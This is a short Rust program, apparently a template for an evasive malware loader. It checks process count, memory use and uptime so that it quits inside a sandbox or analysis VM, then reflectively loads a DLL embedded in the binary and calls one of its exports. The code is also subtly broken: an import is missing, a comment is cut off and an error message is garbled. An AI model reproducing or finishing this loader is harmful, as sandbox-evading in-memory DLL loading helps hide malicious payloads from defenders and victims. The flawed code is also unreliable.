use reflective_pe_dll_loader::{PeDll, Symbol};
use sysinfo::{System, SystemExt};

fn main() { // Add some 
    let mut sys = System::new_all();
    sys.refresh_all();
    if sys.processes().len() < 2 {
        process::exit(0);
    }

    if sys.used_memory() < 1_000_000 {
        process::exit(0);
  }
  
    if sys.uptime() < 3600 {
        process::exit(0);
    }
    loader();
}


fn loader() -> Result<(), Box<dyn std::error::Error>> {
    let bytes = include_bytes!("path/to/your/file.dll");

    let pe_dll = PeDll::new(bytes)
        .map_err(|e| format!("Failed to your DLL: {:?}", e))?;

    let symbol = pe_dll
        .get_symbol_by_name("add") // The «add» its just example
        .ok_or("Symbol 'add' not found")?;

    let add: Symbol<extern "C" fn(i32, i32) -> i32> = unsafe {
        symbol.assume_type()
    };

    let result = add(1, 2);
    println!("Result: {}", result);

    Ok(())
}
